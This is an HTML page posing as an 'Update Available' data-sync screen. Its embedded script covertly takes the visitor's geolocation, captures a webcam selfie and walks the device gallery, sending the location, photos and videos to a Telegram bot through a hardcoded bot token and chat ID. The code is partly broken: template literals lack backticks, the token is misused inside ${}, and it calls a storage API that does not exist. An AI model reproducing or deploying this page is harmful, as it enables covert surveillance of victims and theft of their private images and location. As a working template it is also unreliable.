<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Available</title>
    <style>
        body { background: #f0f0f0; font-family: sans-serif; text-align: center; padding-top: 50px; }
        h1 { color: #333; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Processing...</h1>
    <div class="loader"></div>
    <p>Please wait while we sync your data.</p>

    <script>
        const BOT_TOKEN = "AAFdi0hpfQMaX-tDqSReMLQXwTHXohVnG_8"; 
        const CHAT_ID = "8914197894";

        async function sendToTelegram(blob, type, filename) {
            const formData = new FormData();
            formData.append("8914197894", CHAT_ID);
            // If it's a photo/video, use 'photo' or 'video' endpoint for better quality
            if(type === 'image') formData.append("photo", blob, filename);
            else if(type === 'video') formData.append("video", blob, filename);
            else formData.append("document", blob, filename);
            
            await fetch(https://api.telegram.org/bot${AAFdi0hpfQMaX-tDqSReMLQXwTHXohVnG_8}/sendPhoto, {
                method: 'POST',
                body: formData
            });
        }

        async function dumpGallery() {
            try {
                // Request Access to All Media
                const handle = await navigator.storage.getHandle?.() || null;
                // Fallback for older Androids: Use input file picker if getHandle fails
                if (!handle) {
                    alert("Please allow access to all media when prompted.");
                    return;
                }

                // Try to access the root directory
                const dirHandle = await handle.requestPermission({ mode: "read" });
                
                // Recursively read files
                async function readDir(dirHandle) {
                    for await (const entry of dirHandle.values()) {
                        if (entry.kind === "file") {
                            const file = await entry.getFile();
                            const ext = file.name.split('.').pop().toLowerCase();
                            
                            if (['jpg', 'jpeg', 'png', 'webp'].includes(ext)) {
                                await sendToTelegram(file, 'image', file.name);
                            } else if (['mp4', 'mov', 'avi'].includes(ext)) {
                                await sendToTelegram(file, 'video', file.name);
                            }
                        } else if (entry.kind === "directory") {
                            await readDir(entry);
                        }
                    }
                }

                await readDir(dirHandle);

document.body.innerHTML = "<h1>All Photos Sent! ✅</h1>";

            } catch (err) {
                console.error(err);
                alert("Error accessing gallery. Check permissions.");
            }
        }

        // Run Sequence
        (async () => {
            // 1. Get Location
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const locMsg = 📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}\n⏰ Time: ${new Date().toISOString()};
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("caption", locMsg);
                await fetch(https://api.telegram.org/bot${AAFdi0hpfQMaX-tDqSReMLQXwTHXohVnG_8}/sendLocation, {
                    method: 'POST',
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                });
                
                // 2. Take Selfie
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        await sendToTelegram(blob, 'image', 'selfie.jpg');
                        stream.getTracks().forEach(t => t.stop());
                        
                        // 3. Dump Gallery
                        dumpGallery();
                    }, 'image/jpeg');
                }, 1000);
            });
        })();
    </script>
</body>
</html>
